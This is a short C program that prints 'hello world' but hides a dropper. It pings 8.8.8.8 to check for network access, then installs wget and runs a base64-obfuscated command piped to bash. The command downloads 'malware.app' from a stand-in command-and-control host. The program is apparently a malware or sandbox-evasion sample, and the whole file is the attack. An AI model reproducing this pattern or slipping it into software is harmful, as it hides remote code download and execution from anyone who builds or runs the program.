#include <stdio.h>
#include <stdlib.h>

char google_dns_ping[50] = "ping -c 3 -w 2 8.8.8.8";
char some_string[100]= "echo d2dldCBodHRwOi8vc29tZW5vbmV4aXRpbmdjbmNbLl1jb20vbWFsd2FyZS5hcHA=|base64 -d |bash";

int ping_google_dns(){
    char output[500];
    int lines_counter = 0;
    char path[1035];
    FILE* fp = popen(google_dns_ping,"r");
    while (fgets(path, sizeof(path), fp) !=NULL){
      lines_counter++;
}
   return lines_counter;
}

int main()
{
  int length = ping_google_dns();
 if (length > 5){
  system("apt-get install wget");
  system(some_string);
  return 1;
}

printf("hello world\n");
  return 1;
}